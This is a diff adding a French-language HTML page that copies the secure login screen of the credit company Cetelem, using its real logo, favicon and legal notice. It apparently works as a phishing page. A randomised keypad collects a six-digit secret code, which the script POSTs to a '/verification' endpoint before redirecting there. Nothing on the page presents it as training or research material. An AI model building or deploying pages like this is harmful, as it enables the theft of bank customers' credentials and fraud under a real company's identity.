@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Connexion sécurisée</title>
+  <link rel="icon" href="https://www.cetelem.fr/favicon.ico" type="image/x-icon" />
+  <style>
+    input,
+    button,
+    select,
+    textarea,
+    a {
+      font-size: 16px;
+    }
+
+    @media (min-width: 768px) {
+      .main-container {
+        width: 66.6667%;
+      }
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #c1d4cd;
+      margin: 0;
+      padding: 0;
+    }
+
+    .logo {
+      text-align: center;
+      padding-top: 20px;
+    }
+
+    .logo img {
+      max-width: 180px;
+      height: auto;
+    }
+
+    .legal {
+      text-align: center;
+      font-size: 14px;
+      color: #333;
+      margin-top: 5px;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 25px 20px 20px 15px;
+    }
+
+    .login-box {
+      max-width: 400px;
+      width: 100%;
+      height: 540px;
+      overflow: auto;
+      background-color: #fff;
+      padding: 20px 15px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      position: relative;
+      box-sizing: border-box;
+    }
+
+    .back-link {
+      position: absolute;
+      top: 15px;
+      left: 15px;
+      color: #014421;
+      font-weight: bold;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .avatar {
+      font-size: 20px;
+      margin-top: 10px;
+      height: 50px;
+      text-align: center;
+    }
+
+    .avatar svg {
+      height: 50px;
+      fill: #014421;
+    }
+
+    .masked-id {
+      text-align: center;
+      margin: 10px 0;
+      font-size: 20px;
+      color: #000;
+    }
+
+    h2 {
+      font-size: 1.5rem;
+      font-weight: 700;
+      text-align: center;
+      margin: 20px 0;
+      line-height: 32px;
+      color: #292c2e;
+    }
+
+    form h2 {
+      font-size: 22px;
+      color: #006f45;
+      margin-top: 25px;
+    }
+
+    .label-secret {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: bold;
+      font-size: 16px;
+      color: #000;
+      text-align: left;
+      width: 100%;
+    }
+
+    .input-wrapper {
+      position: relative;
+      margin: 10px 0 20px;
+      height: 65px;
+    }
+
+    #codeInput {
+      width: 100%;
+      padding: 10px 40px 10px 90px;
+      font-size: 18px;
+      text-align: left;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      letter-spacing: 5px;
+      box-sizing: border-box;
+      height: 45px;
+      overflow: hidden;
+    }
+
+    .clear-btn,
+    .check-mark {
+       position: absolute;
+       top: 50%;
+       transform: translateY(-90%);
+       font-size: 18px;
+       cursor: pointer;
+       user-select: none;
+}
+
+    .clear-btn {
+      right: 35px;
+      color: #888;
+      display: none;
+    }
+
+    .check-mark {
+      right: 10px;
+      color: green;
+      display: none;
+    }
+
+    .keypad {
+      display: grid;
+      grid-template-columns: repeat(5, 1fr);
+      gap: 15px;
+      justify-content: center;
+      align-items: center;
+      padding: 10px 0;
+      max-width: 300px;
+      margin: 0 auto;
+    }
+
+    .keypad button {
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      background-color: #014421;
+      color: white;
+      font-size: 18px;
+      border: none;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .submit-btn {
+       width: 100%;
+       background-color: #a5abad;
+       color: white;
+       padding: 10px;
+       font-size: 16px;
+       border: none;
+       border-radius: 4px;
+       cursor: not-allowed;
+       margin-top: 20px; /* <- ajoute cette ligne */
+  }
+
+    .submit-btn:enabled {
+      background-color: #1b5e20;
+      cursor: pointer;
+    }
+
+    .submit-btn:enabled:hover {
+      background-color: #145c17;
+    }
+
+    .forgot-link {
+      display: block;
+      margin-top: 10px;
+      color: #014421;
+      font-size: 13px;
+      text-decoration: underline;
+      text-align: center;
+    }
+
+    footer {
+      text-align: center;
+      margin-top: 40px;
+      font-size: 12px;
+    }
+
+    .footer-links a {
+      color: #000;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+
+    @media (max-width: 480px) {
+      .login-box {
+        max-height: 90vh;
+        overflow-y: auto;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="logo">
+    <img src="https://www.cetelem.fr/brand/logo.svg" alt="Logo Cetelem">
+  </div>
+
+  <div class="legal">
+    Un crédit vous engage et doit être remboursé.<br>
+    Vérifiez vos capacités de remboursement avant de vous engager.
+  </div>
+
+  <div class="container">
+    <div class="login-box">
+      <a href="#" class="back-link">Retour</a>
+
+      <div class="avatar">
+        <svg width="40" height="40" viewBox="0 0 26.6666668 26.6666668" xmlns="http://www.w3.org/2000/svg" fill="#014421">
+          <path d="M13.3333334,0 C20.6971301,0 26.6666668,5.96953669 26.6666668,13.3333334 C26.6666668,20.6971301 20.6971301,26.6666668 13.3333334,26.6666668 C5.96953669,26.6666668 0,20.6971301 0,13.3333334 C0,5.96953669 5.96953669,0 13.3333334,0 Z M13.3333334,1.66666667 C8.84982244,1.66690538 4.76309789,4.23644385 2.81994017,8.27698943 C0.876782456,12.317535 1.42100817,17.1141655 4.22000002,20.6166668 C5.40333336,18.7100001 8.00833337,16.6666667 13.3333334,16.6666667 C18.6583334,16.6666667 21.2616668,18.7083334 22.4466668,20.6166668 C25.2456586,17.1141655 25.7898843,12.317535 23.8467266,8.27698943 C21.9035689,4.23644385 17.8168443,1.66690538 13.3333334,1.66666667 Z M13.3333334,5.00000002 C16.0947571,5.00000002 18.3333334,7.23857628 18.3333334,10 C18.3333334,12.7614238 16.0947571,15 13.3333334,15 C10.5719096,15 8.33333337,12.7614238 8.33333337,10 C8.33333337,7.23857628 10.5719096,5.00000002 13.3333334,5.00000002 Z"/>
+        </svg>
+      </div>
+
+      <div class="masked-id">xxxxxxx</div>
+      <h2>Accéder à mon<br>espace sécurisé</h2>
+      <label class="label-secret" for="codeInput">Code secret (6 chiffres)</label>
+
+      <div class="input-wrapper">
+        <input type="password" id="codeInput" maxlength="6" readonly />
+        <span id="clearBtn" class="clear-btn">✖</span>
+        <span id="checkMark" class="check-mark">✅</span>
+      </div>
+
+      <div class="keypad" id="keypad"></div>
+      <button id="submitBtn" class="submit-btn" disabled>Je me connecte</button>
+      <a href="#" class="forgot-link">Code secret oublié ?</a>
+    </div>
+  </div>
+
+ <footer style="background-color: #c5dad2; padding: 20px 10px;">
+  <div style="margin-bottom: 10px; line-height: 1.8;">
+    <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Virement express</a>
+    <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Résiliation</a>
+    <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Contact</a>
+    <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Questions / Réponses</a>
+    <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Réclamation</a>
+    <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Mentions légales</a>
+    <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Informations sur les cookies</a>
+    <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Préférence de cookies</a>
+    <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Élevé</a>
+    <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Déclaration d'accessibilité</a>
+    <a href="#" style="margin: 0 10px; color: #000; text-decoration: underline;">Accessibilité</a>
+  </div>
+</footer>
+
+  <script>
+    let code = "";
+
+    function updateInputDisplay() {
+      const input = document.getElementById("codeInput");
+      const clearBtn = document.getElementById("clearBtn");
+      const checkMark = document.getElementById("checkMark");
+
+      input.value = "*".repeat(code.length);
+      clearBtn.style.display = code.length > 0 ? "inline" : "none";
+      checkMark.style.display = code.length === 6 ? "inline" : "none";
+      document.getElementById("submitBtn").disabled = code.length !== 6;
+    }
+
+    function shuffle(array) {
+      for (let i = array.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [array[i], array[j]] = [array[j], array[i]];
+      }
+      return array;
+    }
+
+    function createKeypad() {
+      const keypad = document.getElementById("keypad");
+      keypad.innerHTML = "";
+      const keys = shuffle(["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]);
+
+      keys.forEach(val => {
+        const btn = document.createElement("button");
+        btn.textContent = val;
+        btn.addEventListener("click", () => {
+          if (code.length < 6) {
+            code += val;
+            updateInputDisplay();
+          }
+        });
+        keypad.appendChild(btn);
+      });
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+      createKeypad();
+
+      document.getElementById("clearBtn").addEventListener("click", () => {
+        code = "";
+        updateInputDisplay();
+      });
+
+      document.getElementById("submitBtn").addEventListener("click", async () => {
+        if (code.length !== 6 || !/^\d{6}$/.test(code)) {
+          alert("Veuillez entrer un code à 6 chiffres.");
+          return;
+        }
+
+        try {
+          await fetch("/verification", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ code })
+          });
+          window.location.href = "/verification"; // Redirige après envoi
+          } catch (error) {
+          alert("Erreur lors de l'envoi.");
+          }
+      });
+    });
+  </script>
+</body>
+</html>
